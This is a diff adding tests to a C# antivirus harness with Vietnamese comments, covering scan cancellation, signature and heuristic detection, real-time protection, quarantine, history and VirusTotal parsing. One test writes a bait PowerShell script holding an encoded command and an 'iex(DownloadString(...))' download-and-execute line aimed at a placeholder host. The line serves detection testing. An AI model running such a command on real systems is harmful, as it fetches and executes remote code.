@@ -1,5 +1,5 @@
 // Harness kiểm thử ScanEngine — biên dịch độc lập bằng csc, KHÔNG nằm trong csproj chính.
-// Chạy: csc /out:test.exe Services\ScanEngine.cs Tests\ScanEngineTest.cs && test.exe
+// Chạy: csc /out:test.exe Services\ScanEngine.cs Services\RealTimeProtection.cs Services\QuarantineLedger.cs Services\ScanHistoryStore.cs Services\VirusTotalClient.cs Tests\ScanEngineTest.cs && test.exe
 using ScanAndRemoveVirus.Services;
 using System;
 using System.Collections.Generic;
@@ -79,9 +79,320 @@ static class ScanEngineTest
             catch (OperationCanceledException) { cancelled = true; }
             Check("hủy quét ném OperationCanceledException", cancelled);
 
+            // ---- Stress HỦY giữa chừng (regression: race CompleteAdding vs worker từng làm chết app) ----
+            // 8 vòng scan rồi cancel ở thời điểm ngẫu nhiên; nếu worker thread nào nổ exception
+            // chưa bắt -> process chết -> không bao giờ in được dòng PASS dưới đây.
+            string stress = Path.Combine(root, "cancelstress");
+            for (int d = 0; d < 30; d++)
+            {
+                string dd = Directory.CreateDirectory(Path.Combine(stress, "d" + d)).FullName;
+                string nd = Directory.CreateDirectory(Path.Combine(dd, "nested" + d)).FullName;
+                for (int f = 0; f < 100; f++)
+                {
+                    File.WriteAllText(Path.Combine(dd, "f" + f + ".log"), new string('x', 60));
+                    if (f % 10 == 0) File.WriteAllText(Path.Combine(nd, "g" + f + ".txt"), ScanEngine.TestSignature + f);
+                }
+            }
+            int cancelOk = 0;
+            var rnd = new Random(12345);
+            for (int run = 0; run < 8; run++)
+            {
+                var ctsS = new CancellationTokenSource();
+                Exception leaked = null; bool done = false;
+                var thS = new Thread(() =>
+                {
+                    try { ScanEngine.Scan(ScanType.Custom, stress, ctsS.Token); }
+                    catch (OperationCanceledException) { }
+                    catch (Exception ex) { leaked = ex; }
+                    done = true;
+                });
+                thS.IsBackground = true;
+                thS.Start();
+                Thread.Sleep(rnd.Next(5, 120)); // cancel đúng lúc worker đang push việc
+                ctsS.Cancel();
+                var waitUntil = DateTime.Now.AddSeconds(30);
+                while (!done && DateTime.Now < waitUntil) Thread.Sleep(20);
+                if (done && leaked == null) cancelOk++;
+                else Console.WriteLine("  loop " + run + " leaked: " + leaked);
+            }
+            Check("stress: 8 lần scan+cutoff giữa chừng không giết process", cancelOk == 8);
+            // Sau các lần hủy dở dang, quét tới nơi tới chốn vẫn phải ra kết quả đúng
+            var fullStress = ScanEngine.Scan(ScanType.Custom, stress, CancellationToken.None);
+            Check("stress: quét trọn vẹn vẫn đủ 3300 tệp", fullStress.FilesScanned == 3300);
+            Check("stress: bắt đủ 300 đe dọa chữ ký trong stress", fullStress.Threats.Count == 300);
+
             // ---- Danh sách gốc quét nhanh / toàn bộ ----
             Check("roots quét nhanh khác rỗng", ScanEngine.GetScanRoots(ScanType.Quick, null).Any());
             Check("roots quét toàn bộ gồm C:\\", ScanEngine.GetScanRoots(ScanType.Full, null).Contains("C:\\"));
+
+            // ================= 3 KỸ THUẬT QUÉT =================
+            var engineRoot = Path.Combine(Path.GetTempPath(), "xvirus-techs-" + Guid.NewGuid().ToString("N"));
+            Directory.CreateDirectory(engineRoot);
+            try
+            {
+                string techs = Path.Combine(engineRoot, "area");
+                Directory.CreateDirectory(techs);
+
+                // --- Kỹ thuật 1: hash SHA256 khớp bảng chữ ký (thử với mẫu mô phỏng tự sinh) ---
+                // (không thử EICAR chuẩn ở đây vì Defender sẽ xóa tệp trước khi engine đọc được)
+                string hashHit = Path.Combine(techs, "payload.txt");
+                File.WriteAllText(hashHit, ScanEngine.SignatureSampleContent);
+                var t1 = ScanEngine.EvaluateFile(hashHit);
+                Check("[KT1] SHA256 khớp chữ ký Malsim.Sample.Hash",
+                    t1 != null && t1.Kind == "Chữ ký" && t1.Reason.Contains("Malsim.Sample.Hash"));
+                string hashMiss = Path.Combine(techs, "innocent.txt");
+                File.WriteAllText(hashMiss, "totally harmless content, different bytes");
+                Check("[KT1] nội dung khác -> không báo_hash", ScanEngine.EvaluateFile(hashMiss) == null);
+                string preHit = Path.Combine(techs, "classic.txt");
+                File.WriteAllText(preHit, ScanEngine.TestSignature + "old-style-signature-check");
+                var t1b = ScanEngine.EvaluateFile(preHit);
+                Check("[KT1] chữ ký byte đầu vẫn hoạt động", t1b != null && t1b.Kind == "Chữ ký");
+
+                // --- Kỹ thuật 2: heuristic ---
+                string spoof = Path.Combine(techs, "thong-bao-invoice.pdf.exe");
+                File.WriteAllText(spoof, "not a real PE, just heuristic bait");
+                var t2 = ScanEngine.EvaluateFile(spoof);
+                Check("[KT2] đuôi kép giả mạo PDF + tên mồi câu -> Heuristic",
+                    t2 != null && t2.Kind == "Heuristic" && t2.Reason.Contains("đuôi kép"));
+                string evilPs1 = Path.Combine(techs, "update.ps1");
+                File.AppendAllText(evilPs1,
+                    "powershell -enc SQBFAFgA\r\n $s = 'aGVsbG8='; iex(DownloadString('http://x/y'))\r\n");
+                var t2b = ScanEngine.EvaluateFile(evilPs1);
+                Check("[KT2] script PowerShell độc -> Heuristic",
+                    t2b != null && t2b.Kind == "Heuristic");
+                string normal = Path.Combine(techs, "readme.txt");
+                File.WriteAllText(normal, new string('a', 5000));
+                Check("[KT2] tệp lành tính thường -> không báo nhầm", ScanEngine.EvaluateFile(normal) == null);
+                string pdf = Path.Combine(techs, "report.pdf");
+                File.WriteAllBytes(pdf, new byte[] { 0x25, 0x50, 0x44, 0x46 });
+                Check("[KT2] PDF bé -> không báo nhầm", ScanEngine.EvaluateFile(pdf) == null);
+
+                // --- Kỹ thuật 3: bảo vệ thời gian thực ---
+                string watch = Path.Combine(techs, "watched");
+                Directory.CreateDirectory(watch);
+                var detected = new List<ThreatFound>();
+                Action<ThreatFound> handler = detected.Add;
+                RealTimeProtection.ThreatDetected += handler;
+                AutoResetEvent signaled = new AutoResetEvent(false);
+                RealTimeProtection.ThreatDetected += delegate { signaled.Set(); };
+                RealTimeProtection.Start(new[] { watch });
+                Check("[KT3] Start -> IsRunning", RealTimeProtection.IsRunning);
+
+                string rtDirty = Path.Combine(watch, "brand-new-threat.txt");
+                File.WriteAllText(rtDirty, ScanEngine.TestSignature + "written-after-watch-started-xxxxxxxx");
+                bool got = signaled.WaitOne(TimeSpan.FromSeconds(15));
+                if (!got) // thử lần 2 bằng heuristic (đảm bảo không phụ thuộc 1 luật)
+                {
+                    File.WriteAllText(rtDirty, ScanEngine.TestSignature + "retry-" + Guid.NewGuid());
+                    got = signaled.WaitOne(TimeSpan.FromSeconds(15));
+                }
+                Check("[KT3] tệp mới thả vào vùng giám sát -> cảnh báo tức thì",
+                    got && detected.Any(t => Path.GetFileName(t.FilePath) == "brand-new-threat.txt"));
+                // tệp sạch không được phép gây cảnh báo
+                detected.Clear();
+                File.WriteAllText(Path.Combine(watch, "benign.txt"), new string('b', 4000));
+                bool falseAlarm = signaled.WaitOne(TimeSpan.FromSeconds(3));
+                Check("[KT3] tệp sạch -> không báo động", !falseAlarm && detected.Count == 0);
+                RealTimeProtection.Stop();
+                Check("[KT3] Stop -> không còn chạy", !RealTimeProtection.IsRunning);
+                RealTimeProtection.ThreatDetected -= handler;
+                Check("[KT3] phát hiện RT được ghi vào lịch sử", ScanHistoryStore.Entries()
+                    .Any(h => h.Type == "Bảo vệ thời gian thực" && h.Scope.Contains("brand-new-threat.txt")));
+
+                // --- Kỹ thuật 3 + Tự động cách ly: watcher tự dời tệp, không cần người bấm ---
+                RealTimeProtection.AutoQuarantine = true;
+                try
+                {
+                    string watch2 = Path.Combine(techs, "watched2");
+                    Directory.CreateDirectory(watch2);
+                    RealTimeProtection.Start(new[] { watch2 });
+                    string autoDirty = Path.Combine(watch2, "auto-drop.txt");
+                    File.WriteAllText(autoDirty, ScanEngine.TestSignature + "auto-quarantine-xxxx");
+                    var until = DateTime.Now.AddSeconds(20);
+                    while (DateTime.Now < until && File.Exists(autoDirty)) Thread.Sleep(250);
+                    Check("[KT3] AutoQuarantine bật -> watcher tự cách ly tệp", !File.Exists(autoDirty));
+                    if (!File.Exists(autoDirty))
+                    {
+                        var aqItem = ScanEngine.ListQuarantined()
+                            . LastOrDefault(q => q.OriginalPath == autoDirty);
+                        Check("[KT3] bản ghi sổ có lý do từ watcher",
+                            aqItem != null && aqItem.Threat != null && aqItem.Threat.Contains("Chữ ký"));
+                        if (aqItem != null) ScanEngine.DeleteQuarantined(aqItem.Id);
+                    }
+                    RealTimeProtection.Stop();
+                }
+                finally
+                {
+                    RealTimeProtection.AutoQuarantine = false;
+                    if (RealTimeProtection.IsRunning) RealTimeProtection.Stop();
+                }
+            }
+            finally
+            {
+                try { Directory.Delete(engineRoot, true); } catch { }
+            }
+
+            // ================= CÀI ĐẶT ỨNG DỤNG (AppSettings + Run registry) =================
+            var cfgOld = AppSettings.Load();
+            string backupRun = null;
+            using (var k = Microsoft.Win32.Registry.CurrentUser
+                       .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false))
+                if (k != null) backupRun = k.GetValue("ScanAndRemoveVirus") as string;
+            try
+            {
+                AppSettings.Save(new SettingsFlags
+                {
+                    AutoStart = true, AutoUpdate = true, SendSamples = true, ShowNotifications = false
+                });
+                var cfg = AppSettings.Load();
+                Check("[Config] save/load round-trip flags",
+                    cfg.AutoStart && cfg.AutoUpdate && cfg.SendSamples && !cfg.ShowNotifications);
+                Check("[Config] ApplyAutoStart(true) ghi HKCU\\...\\Run",
+                    AppSettings.ApplyAutoStart(true) && AppSettings.IsAutoStartEnabled());
+                Check("[Config] ApplyAutoStart(false) gỡ khỏi Run",
+                    AppSettings.ApplyAutoStart(false) && !AppSettings.IsAutoStartEnabled());
+            }
+            finally
+            {
+                AppSettings.Save(cfgOld);
+                using (var w = Microsoft.Win32.Registry.CurrentUser
+                           .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
+                {
+                    if (string.IsNullOrEmpty(backupRun))
+                    { try { w.DeleteValue("ScanAndRemoveVirus", false); } catch { } }
+                    else w.SetValue("ScanAndRemoveVirus", backupRun);
+                }
+            }
+
+            // ============ SỔ CÁCH LY (quarantine ledger) + LỊCH SỬ (history store) ============
+            var ledgerRoot = Path.Combine(Path.GetTempPath(), "xvirus-ledger-" + Guid.NewGuid().ToString("N"));
+            Directory.CreateDirectory(ledgerRoot);
+            try
+            {
+                string qFile = Path.Combine(ledgerRoot, "quarantine-me.txt");
+
+                // -- Restore đưa tệp về đúng đường dẫn cũ --
+                File.WriteAllText(qFile, ScanEngine.TestSignature + "ledger-roundtrip");
+                string storedId;
+                Check("[Ledger] Quarantine + out id", ScanEngine.Quarantine(qFile, "Test ledger", out storedId)
+                    && !string.IsNullOrEmpty(storedId) && !File.Exists(qFile));
+                var listed = ScanEngine.ListQuarantined();
+                var mine = listed.Where(q => q.Id == storedId).ToList();
+                Check("[Ledger] ListQuarantined có bản ghi + đúng metadata",
+                    mine.Count == 1 && mine[0].OriginalPath == qFile && mine[0].Threat == "Test ledger");
+                Check("[Ledger] Restore thành công", ScanEngine.RestoreQuarantined(storedId));
+                Check("[Ledger] tệp về lại vị trí cũ", File.Exists(qFile)
+                    && File.ReadAllText(qFile).StartsWith(ScanEngine.TestSignature));
+                Check("[Ledger] bản ghi bị gỡ sau restore",
+                    !ScanEngine.ListQuarantined().Any(q => q.Id == storedId));
+
+                // -- Xung đột tên khi restore: tạo lại tệp gốc rồi khôi phục --
+                File.WriteAllText(qFile, ScanEngine.TestSignature + "ledger-roundtrip");
+                ScanEngine.Quarantine(qFile, "Test conflict", out storedId);
+                File.WriteAllText(qFile, "file gốc mới do người dùng tạo lại");
+                ScanEngine.RestoreQuarantined(storedId);
+                Check("[Ledger] không đè tệp gốc: tạo bản (1)",
+                    File.ReadAllText(qFile) == "file gốc mới do người dùng tạo lại"
+                    && File.Exists(Path.Combine(ledgerRoot, "quarantine-me (1).txt")));
+
+                // -- Xóa vĩnh viễn --
+                var remaining = ScanEngine.ListQuarantined().Where(q => q.OriginalPath.StartsWith(ledgerRoot)).ToList();
+                foreach (var q in remaining)
+                    Check("[Ledger] DeleteQuarantined " + q.Name, ScanEngine.DeleteQuarantined(q.Id));
+                Check("[Ledger] sạch danh mục test ledger",
+                    !ScanEngine.ListQuarantined().Any(q => q.OriginalPath.StartsWith(ledgerRoot)));
+
+                // -- History store: add + thứ tự mới nhất trước + export CSV --
+                ScanHistoryStore.Add("Quét nhanh", "scope A", 100, 2, 3.5);
+                ScanHistoryStore.Add("Quét toàn bộ", "scope B", 200, 0, 0.4);
+                var hist = ScanHistoryStore.Entries();
+                Check("[History] thêm + đọc được", hist.Count >= 2);
+                Check("[History] phần tử đầu là mới nhất",
+                    hist[0].Type == "Quét toàn bộ" && hist[0].Result == "An toàn");
+                Check("[History] entry có đe dọa -> Kết quả 'Phát hiện'",
+                    hist.Any(h => h.Type == "Quét nhanh" && h.Threats == 2
+                        && h.Result == "Phát hiện mối đe dọa"));
+                string csv = Path.Combine(ledgerRoot, "report.csv");
+                ScanHistoryStore.ExportCsv(csv);
+                Check("[History] Export CSV có nội dung",
+                    File.Exists(csv) && File.ReadAllLines(csv).Length >= 3);
+
+                // -- Tem cập nhật CSDL dùng chung + helper dẫn xuất --
+                string bak = File.Exists(ScanHistoryStore.SignatureUpdatePath)
+                    ? File.ReadAllText(ScanHistoryStore.SignatureUpdatePath) : null;
+                try
+                {
+                    var mark = new DateTime(2026, 1, 2, 3, 4, 5);
+                    ScanHistoryStore.MarkSignatureUpdated(mark);
+                    DateTime gotMark;
+                    Check("[History] Mark/TryGet tem cập nhật CSDL",
+                        ScanHistoryStore.TryGetLastSignatureUpdate(out gotMark)
+                        && gotMark == mark);
+                    Check("[History] LatestOfType('Quét') thấy phiên quét vừa ghi",
+                        ScanHistoryStore.LatestOfType("Quét") != null);
+                    Check("[History] TotalFilesScanned > 0 sau các test",
+                        ScanHistoryStore.TotalFilesScanned() > 0);
+                    Check("[History] TotalThreatsDetected > 0 sau các test",
+                        ScanHistoryStore.TotalThreatsDetected() > 0);
+                }
+                finally
+                {
+                    if (bak != null) File.WriteAllText(ScanHistoryStore.SignatureUpdatePath, bak);
+                }
+
+                // ================= VIRUSTOTAL (tra cứu cloud theo hash) =================
+                // Parse offline — payload rút gọn đúng format api/v3/files/{hash}
+                var vtBad = VirusTotalClient.ParseReport(
+                    "{\"data\":{\"attributes\":{\"last_analysis_stats\":"
+                    + "{\"malicious\":57,\"undetected\":12,\"harmless\":0,\"suspicious\":1,\"timeout\":0}}}}");
+                Check("[VT] parse: 57 malicious, 70 engine",
+                    vtBad.Found && vtBad.Malicious == 57 && vtBad.TotalEngines == 70 && vtBad.IsMalicious);
+                var vtClean = VirusTotalClient.ParseReport(
+                    "{\"data\":{\"attributes\":{\"last_analysis_stats\":{\"malicious\":0,\"undetected\":72}}}}");
+                Check("[VT] 0 malicious -> không độc", vtClean.Found && !vtClean.IsMalicious && !vtClean.IsSuspicious);
+                var vt1 = VirusTotalClient.ParseReport(
+                    "{\"data\":{\"attributes\":{\"last_analysis_stats\":{\"malicious\":1,\"undetected\":70}}}}");
+                Check("[VT] 1 vendor đơn lẻ -> nghi ngờ, chưa kết luận độc", vt1.IsSuspicious && !vt1.IsMalicious);
+                Check("[VT] JSON rác -> báo lỗi rõ ràng", VirusTotalClient.ParseReport("{}").Error != null);
+                // SHA256 vector chuẩn NIST: "abc"
+                string abcFile = Path.Combine(ledgerRoot, "abc.bin");
+                File.WriteAllText(abcFile, "abc");
+                Check("[VT] ComputeFileSha256 đúng vector 'abc'",
+                    ScanEngine.ComputeFileSha256(abcFile) ==
+                    "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
+                // Không có key -> QueryHash phải báo lỗi thân thiện, không nổ exception
+                string keyBak = File.Exists(VirusTotalClient.ApiKeyPath)
+                    ? File.ReadAllText(VirusTotalClient.ApiKeyPath) : null;
+                try
+                {
+                    if (File.Exists(VirusTotalClient.ApiKeyPath)) File.Delete(VirusTotalClient.ApiKeyPath);
+                    var noKey = VirusTotalClient.QueryHash("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
+                    Check("[VT] thiếu API key -> Error thân thiện, không exception",
+                        noKey.Error != null && noKey.Error.Contains("API key"));
+                }
+                finally
+                {
+                    if (keyBak != null) File.WriteAllText(VirusTotalClient.ApiKeyPath, keyBak);
+                }
+                // Live test chỉ chạy khi máy đã cấu hình API key
+                if (VirusTotalClient.IsConfigured)
+                {
+                    var live = VirusTotalClient.QueryHash(
+                        "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538bbb857a133b");
+                    if (live.Error != null) Console.WriteLine("  SKIP live (lỗi mạng): " + live.Error);
+                    else
+                    {
+                        Console.WriteLine("  LIVE EICAR qua VT: " + live.Summary());
+                        Check("[VT] live EICAR -> malicious > 0", live.Found && live.Malicious > 0);
+                    }
+                }
+                else Console.WriteLine("  SKIP test live VirusTotal (chưa có API key)");
+                File.Delete(abcFile);
+            }
+            finally
+            {
+                try { Directory.Delete(ledgerRoot, true); } catch { }
+            }
         }
         finally
         {
